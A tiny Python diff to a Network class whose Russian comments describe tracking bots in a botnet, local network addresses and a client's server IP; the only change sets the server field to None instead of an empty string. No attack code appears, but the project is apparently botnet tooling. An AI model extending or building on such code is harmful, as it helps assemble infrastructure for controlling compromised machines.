@@ -30,7 +30,7 @@ class Network:
         self.OS = platform.system()  # Операционная система
         self.addr = []  # Все адреса в локальной сети
         self.bots = {}  # Список ботов в ботнете и статус получения данных
-        self.server = ""  # Для клиента ip сервера
+        self.server = None  # Для клиента ip сервера
         self.Action = None
         self.ready = 0
 
